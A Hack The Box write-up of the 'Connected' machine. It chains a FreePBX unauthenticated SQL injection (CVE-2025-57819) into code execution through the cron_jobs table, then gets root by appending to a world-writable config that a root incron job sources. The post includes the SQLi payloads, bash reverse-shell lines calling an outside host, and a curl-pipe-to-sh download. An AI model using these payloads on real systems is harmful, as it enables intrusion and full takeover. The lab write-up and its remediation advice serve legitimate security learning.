---
title: HTB — Connected Writeup
excerpt: Walkthrough of the Hack The Box "Connected" machine — an unauthenticated FreePBX SQL injection (CVE-2025-57819) chained into RCE for the foothold, then a world-writable config file sourced by a root incron job for privilege escalation to root.
date: 2026-10-03
author: Haytham
readTime: 12 min
tags: [Writeups, Hack The Box, FreePBX, SQL Injection, Linux, Privilege Escalation]
coverImage: https://images.unsplash.com/photo-1555949963-ff9fe0c870eb?q=80&w=2670&auto=format&fit=crop
---

# HackTheBox — Connected

> **OS:** Linux (CentOS 7) · **Service:** FreePBX / Asterisk
> **Foothold:** CVE-2025-57819 — FreePBX unauthenticated SQL injection → RCE
> **Privesc:** Writable config sourced by a root-triggered `incron` job

---

## Overview

Connected is a Linux box running a FreePBX telephony stack. The web front end
exposes a FreePBX version vulnerable to **CVE-2025-57819**, an unauthenticated
SQL injection in the Endpoint Manager module that can be chained into remote
code execution through FreePBX's own `cron_jobs` table. That lands a shell as
the `asterisk` user.

Local enumeration points at a handful of kernel exploits that turn out to be
dead ends, but the real path is an `incron` (inotify-cron) setup: a root job
fires whenever a trigger file in the Asterisk spool directory is written, and
one of the scripts it runs sources a **world-writable config file**. Appending a
reverse shell to that file and touching the trigger gives a root shell.

---

## Enumeration

### Port scan

Full TCP sweep first, then a service/version scan on what's open:

```bash
nmap -p- --min-rate 1000 -T4 -Pn --open -oA scans/allports 10.129.245.100
nmap -p 22,80,443 -sC -sV -O -Pn -oA scans/deep 10.129.245.100
```

```
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http      Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
443/tcp open  ssl/https Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
```

Three ports: SSH and HTTP(S). The TLS certificate on 443 carries the common name
**`pbxconnect`**, the first hint that this is a FreePBX/PBX appliance. CentOS 7 +
Apache 2.4.6 + PHP 7.4 is the classic FreePBX distro signature.

Add the hostname to `/etc/hosts`:

```bash
echo '10.129.245.100 connected.htb' | sudo tee -a /etc/hosts
```

### Web enumeration

Browsing the site leads to the FreePBX **User Control Panel** at
`http://connected.htb/ucp/`, a login form asking for a username and password.

Intercepting the login request is informative — the password is **base64-encoded**
(with a trailing URL-encoded `==`, i.e. `%253D%253D`) before being posted to:

```
POST /ucp/ajax.php?module=userman&command=checkPasswordReminder
```

That's an interesting detail, but it's a rabbit hole: there's no need to attack
the login at all. The FreePBX build in use is **16.0.40.7**, which falls in the
vulnerable range for a recent, *unauthenticated* SQLi-to-RCE chain — so the
username/password form can be skipped entirely.

---

## Foothold — CVE-2025-57819 (FreePBX unauthenticated SQLi → RCE)

### The vulnerability

The FreePBX **Endpoint Manager** AJAX handler concatenates the `brand` parameter
directly into a SQL query, and the module path
`FreePBX\modules\endpoint\ajax` **bypasses the AJAX Referrer/authentication
check**. The result is an unauthenticated, error-based SQL injection (via
`EXTRACTVALUE`) with **stacked-query writes** enabled.

> **Affected:** FreePBX 15 < 15.0.66, 16 < 16.0.89, 17 < 17.0.3.
> The target runs 16.0.40.7 — well inside the window.

Injection point:

```
GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax
    &command=model&template=x&model=model&brand=<INJECTION>
```

Confirm it with an error-based read of the current DB user:

```
brand=x' AND EXTRACTVALUE(1,CONCAT('~',(SELECT USER()),'~')) -- -
→ {"error":{"message":"... XPATH syntax error: '~freepbxuser@localhost~' ..."}}
```

The database user leaks straight back in the XPATH error message — injection
confirmed.

### SQLi → RCE

The error-based primitive is read-only on its own, but stacked queries let us
**write**. FreePBX runs scheduled jobs out of its `cron_jobs` table via the
built-in cron manager, so inserting a row with an OS command gives arbitrary
code execution the next time the manager syncs (schedule `* * * * *`, so within
~60 seconds):

```sql
INSERT INTO cron_jobs
  (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)
VALUES ('sysadmin','<job>','<os-command>',NULL,'* * * * *',30,1,1);
```

The injected command is a bash reverse shell:

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.246/4444 0>&1"
```

### Automated exploit

The Poc is already available on github. so i cloned the repo and ran the exploit with the appropriate prams. 

```bash
python3 exploit.py http://connected.htb --ip 10.10.14.246 -p 4444
```

What it does:

1. Confirms the SQLi by leaking `VERSION()` through the XPATH error channel.
2. Starts a TCP listener on the chosen port.
3. Injects the reverse-shell cron job and verifies the row landed.
4. Waits ~70s for the cron manager to fire the row, then drops into an
   interactive shell (with an automatic `pty` upgrade).
5. Deletes the injected `cron_jobs` row so it doesn't call back repeatedly.

```
[*] Confirming SQLi on http://connected.htb ...
[+] Vulnerable! DB version: 10.x-MariaDB
[*] Listening on 0.0.0.0:4444
[*] Injecting reverse-shell cron job ...
[+] Cron job 'jxxxxxxx' inserted (runs every minute).
[*] Waiting for callback (up to ~70s) ...
[+] Shell from 10.129.245.100 !
```

That shell lands as the **`asterisk`** user — enough to read `user.txt`. which is the 1st flag.

---

## Privilege Escalation

### Local enumeration

Pulled `linpeas.sh` over with a quick HTTP server from the attacking box:

```bash
# attacker
sudo python3 -m http.server 80

# target
curl 10.10.14.246:80/linpeas.sh | sh
```

before running the HTTPS server to download the script directly by executing the cmd : 

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

but the host couldn't recognize the host github so i decided to go the offline way and turn a simple python webserver in my machine and try to get the linpeas.sh by using it.
### Kernel-exploit dead ends

`linpeas` flagged a few kernel/privesc CVEs as *possible*:

- **CVE-2021-4034 (PwnKit)** — tried [berdav/CVE-2021-4034](https://github.com/berdav/CVE-2021-4034). Didn't work.
- **CVE-2021-27365** — noted but not the path.
- **DirtyFrag (CVE-2026-43284 / CVE-2026-43500)** — tried [V4bel/dirtyfrag](https://github.com/V4bel/dirtyfrag),
  compiled with `gcc exp.c -std=c99` and ran the binary. Also didn't work.

> Lesson: don't tunnel-vision on kernel CVEs just because an enumeration script
> lists them as "probable." Go back and read the rest of the output.

### The real vector — incron + a writable config

Re-reading the `linpeas` output, the interesting part was the **incron**
(inotify-based cron) configuration. incron watches files and runs a command as
root the moment a watched file is written/modified:

```
/var/spool/asterisk/sysadmin/vpnget            IN_CLOSE_WRITE  /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop  IN_CLOSE_WRITE  /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron        IN_CLOSE_WRITE  /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup            IN_CLOSE_WRITE  /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart         IN_CLOSE_WRITE  /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart             IN_CLOSE_WRITE  /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger                         IN_CLOSE_WRITE  /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron    IN_CLOSE_WRITE  /usr/bin/sysadmin_manager --local $#
/var/spool/asterisk/incron    IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#
```

So there are two moving parts per entry: a **trigger file** that's watched, and a
**script** that runs as root when the trigger changes.

First, which files can I actually write? Enumerate world-writable files:

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

```
/sys/fs/cgroup/memory/cgroup.event_control
/etc/firewall-4.rules
/etc/firewall-6.rules
/usr/local/asterisk/ha_trigger
```

`/usr/local/asterisk/ha_trigger` is both world-writable **and** an incron
trigger — tempting. But writing the *trigger* just launches `sysadmin_ha`
unchanged; it's the triggered **script** that runs as root, and overwriting the
trigger file itself gets me nothing. The useful target is a file that the
root-run scripts *read*, not the trigger.

To avoid checking permissions by hand, a tiny script walks every script/trigger
referenced by incron:

```bash
#!/bin/bash
files=("/usr/sbin/sysadmin_openvpn"
"/etc/init.d/fail2ban"
"/usr/sbin/sysadmin_update_set_cron"
"/usr/sbin/sysadmin_portmgmt"
"/usr/sbin/sysadmin_wanrouter_restart"
"/usr/sbin/sysadmin_dahdi_restart"
"/usr/sbin/sysadmin_ha"
"/usr/bin/sysadmin_manager"
"/var/spool/asterisk/sysadmin/dahdi_restart"
"/usr/local/asterisk/ha_trigger"
"/usr/local/asterisk/incron")

for f in "${files[@]}"; do
    echo "$f"
    [ -w "$f" ] && echo WRITABLE || echo NOT WRITABLE
done
```

Every one of the scripts comes back **NOT WRITABLE**. So instead of overwriting a
script, I read what each one *does*.

The payoff is **`sysadmin_dahdi_restart`** (fired by the
`/var/spool/asterisk/sysadmin/dahdi_restart` trigger). It runs as root and pulls
in DAHDI's init configuration — and that config file, **`/etc/dahdi/init.conf`**,
is writable by me.

### Getting root

Append a reverse shell to the config file that the root job sources:

```bash
printf '\nbash -i >& /dev/tcp/10.10.14.246/6666 0>&1\n' >> /etc/dahdi/init.conf
```

Start a listener on the attacking box:

```bash
nc -lvnp 6666
```

Then **touch the trigger** so incron fires `sysadmin_dahdi_restart` as root,
which sources our poisoned `init.conf`:

```bash
touch /var/spool/asterisk/sysadmin/dahdi_restart
```

A few seconds later the listener catches a **root** shell:

```
connect to [10.10.14.246] from (UNKNOWN) [10.129.245.100]
# id
uid=0(root) gid=0(root) groups=0(root)
```

`root.txt` is now readable. 🎉

---

## Remediation

- **Patch FreePBX.** Upgrade past the fixed releases for CVE-2025-57819
  (15.0.66 / 16.0.89 / 17.0.3). Restrict the admin/endpoint AJAX surface so it
  isn't reachable unauthenticated.
- **Fix file permissions.** `/etc/dahdi/init.conf` (and the other
  world-writable files) should not be writable by the `asterisk` service
  account. Root-run scripts must never source config that a lower-privileged
  user can modify.
- **Harden incron.** Watched trigger files and the scripts/configs they touch
  should be owned by root with tight permissions, so a service compromise can't
  pivot into a root-run job.

## Takeaways

- Version-fingerprint the app before brute-forcing anything — an unauthenticated
  CVE beat attacking the login form outright.
- `linpeas` output is more than its "probable kernel exploit" banner. The actual
  root was an `incron` job reading a writable config — a logic flaw, not a
  memory-corruption exploit.
- When a root job won't let you overwrite its script, look at what that script
  **reads**.

---

## References

- [Horizon3.ai — Updated FreePBX CVEs: Auth Bypass & RCE](https://horizon3.ai/attack-research/vulnerabilities/cve-2025-57819/)
- [watchTowr Labs — FreePBX CVE-2025-57819](https://labs.watchtowr.com/you-already-have-our-personal-data-take-our-phone-calls-too-freepbx-cve-2025-57819/)
- [watchTowr PoC (GitHub)](https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819)
- [NVD — CVE-2025-57819](https://nvd.nist.gov/vuln/detail/CVE-2025-57819)
- [FreePBX advisory GHSA-m42g-xg4c-5f3h](https://github.com/FreePBX/security-reporting/security/advisories/GHSA-m42g-xg4c-5f3h)
